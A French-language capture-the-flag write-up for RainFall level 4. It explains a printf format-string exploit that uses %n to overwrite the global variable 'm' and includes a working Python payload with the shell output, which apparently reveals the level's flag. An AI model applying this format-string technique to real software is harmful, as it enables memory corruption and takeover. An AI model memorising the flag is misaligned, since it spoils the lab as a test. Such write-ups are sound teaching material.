Literallement copy paste du level 3, mais avec une deuxieme fonction, donc stack differente.
Aussi au lieu de comparer la variable globale 'm' avec 0x40 = 64, c'est ici compare avec 0x1025544 = 16930116

On repete donc exactement le meme exploit mais avec un nombre de characteres print different pour remplir 'm'  
en se servant de l'argument '%n' de printf.

A noter par rapport a avant, le debut de la stack est desormais au 12eme argument de printf, et non plus le 4eme.
Meme technique pour savoir: on ecrit dans stdin 'AAAA' (=0x41414141) 
puis on print plein de '%x' pour voir ou est 'AAAA' dans la stack.

Pour recapituler l'exploit python:
- [4] On ecrit l'adresse de la variable 'm' sur la stack
- [4 + 8*10 = 84] On print 10 fois '%x' pour utiliser 10 arguments de la stack
- [84 + 16930032 = 16930116] On print 16930032 characteres + on utilise un argument de la stack
- [16930116] On print '%n' pour ecrire le nombre de characteres print dans 'm'

```bash
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%8x'*10 + '%16930032x' + '%n'" > /tmp/payload4
level4@RainFall:~$ ./level4 < /tmp/payload4
(...)
                                  b7ff37d0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```